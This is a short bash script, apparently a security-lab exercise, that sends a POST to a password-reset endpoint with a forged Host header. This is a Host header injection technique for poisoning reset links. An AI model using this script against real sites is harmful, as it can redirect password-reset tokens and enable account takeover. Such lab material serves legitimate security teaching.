#!/bin/bash
set -euo pipefail

# Usage check
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
  echo "Example: $0 newhost http://web0x00.hbtn/reset_password 'email=test@test.hbtn'"
  exit 1
fi

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

curl -sS \
  -X POST \
  -H "Host: ${NEW_HOST}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-raw "${FORM_DATA}" \
  "${TARGET_URL}"
